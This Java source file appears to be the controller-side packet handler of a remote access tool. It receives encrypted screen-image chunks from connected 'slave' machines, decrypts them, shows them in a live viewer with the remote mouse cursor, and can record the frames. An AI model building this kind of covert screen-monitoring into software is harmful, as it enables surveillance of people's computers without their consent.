package com.redpois0n.packets;

import java.awt.Graphics;
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.util.HashMap;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;

import com.redpois0n.Main;
import com.redpois0n.RemoteScreenData;
import com.redpois0n.Slave;
import com.redpois0n.Traffic;
import com.redpois0n.common.crypto.Crypto;
import com.redpois0n.threads.ThreadImage;
import com.redpois0n.threads.ThreadRemoteScreenRecorder;
import com.redpois0n.ui.frames.FrameRemoteScreen;
import com.redpois0n.util.ImageUtils;


public class PacketIMAGECOMING extends Packet {

	public boolean requestAgain = true;
	public static final HashMap<Slave, RemoteScreenData> instances = new HashMap<Slave, RemoteScreenData>();
	public static Image MOUSE_CURSOR;
	
	static {
		try {
			MOUSE_CURSOR = ImageIO.read(Main.class.getResource("/icons/mouse_pointer.png"));
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	public void read(Slave slave, String line) throws Exception {
		int w = slave.readInt();
		int h = slave.readInt();
		
		int mouseX = slave.readInt();
		int mouseY = slave.readInt();
		
		RemoteScreenData itd = instances.get(slave);
		
		if (itd == null) {
			itd = new RemoteScreenData(slave, w, h);
			instances.put(slave, itd);
		}
		BufferedImage bufferedImage = itd.getBufferedImage();

		FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
		if (frame != null && frame.running) {
			try {
				Graphics imageGraphics = bufferedImage.getGraphics();
				
				int rows = frame.rows;
		        int cols = frame.cols;  
		  
		        int chunkWidth = w / cols; 
		        int chunkHeight = h / rows;  
		        
		        frame.progressBar.setMaximum(rows * cols);	
		        frame.progressBar.setValue(0);
					
		        int chunks = 0;
		        int updatedChunks = 0;
		        int size = 0;
		        
				for (int x = 0; x < rows; x++) {  
		            for (int y = 0; y < cols; y++) {  
		            	chunks++;
		            	if (slave.getDataInputStream().readBoolean()) {		  
		            		updatedChunks++;
		            		int blen = slave.getDataInputStream().readInt();
							byte[] buffer = new byte[blen];
							slave.getDataInputStream().readFully(buffer);
							
							buffer = Crypto.decrypt(buffer, slave.getConnection().getKey());
							
							BufferedImage image = ImageUtils.decodeImage(buffer);						
							imageGraphics.drawImage(image, chunkWidth * y, chunkHeight * x, null);	
							
							Traffic.increaseReceived(slave, blen);
							frame.lbl.repaint();		
							frame.lbl.revalidate();
							frame.progressBar.setValue(frame.progressBar.getValue() + 1);
							frame.setLatestChunkSize(blen);
							frame.setUpdatedChunks(updatedChunks);
							size += blen;
		            	}	
		            	frame.setTotalChunks(chunks);
		            	System.out.println("Total chunks: " + chunks + " " + x + " " + y);
		            }
				}
				
				imageGraphics.drawImage(MOUSE_CURSOR, mouseX, mouseY, 16, 16, null);
				frame.lbl.repaint();

				frame.setSize(size);
				
				frame.getFPSThread().increase();

				if (frame.record) {
					new ThreadRemoteScreenRecorder(frame.recorder.getPath(), bufferedImage, frame.recorder.getCount(), frame.recorder.getExtension()).start();
				}

				if (!itd.hasCreatedIcon()) {
					ImageIcon imageicon = new ImageIcon(bufferedImage);
					frame.icon.setImage(imageicon.getImage());
					itd.setIcon();
				}
				
				System.gc();
			
				
				if (requestAgain) {
					new ThreadImage(frame.getDelay(), slave).start();
				}

				
			} catch (Exception ex) {
				ex.printStackTrace();
				System.exit(0);
				System.gc();
			}
		}
	}
}
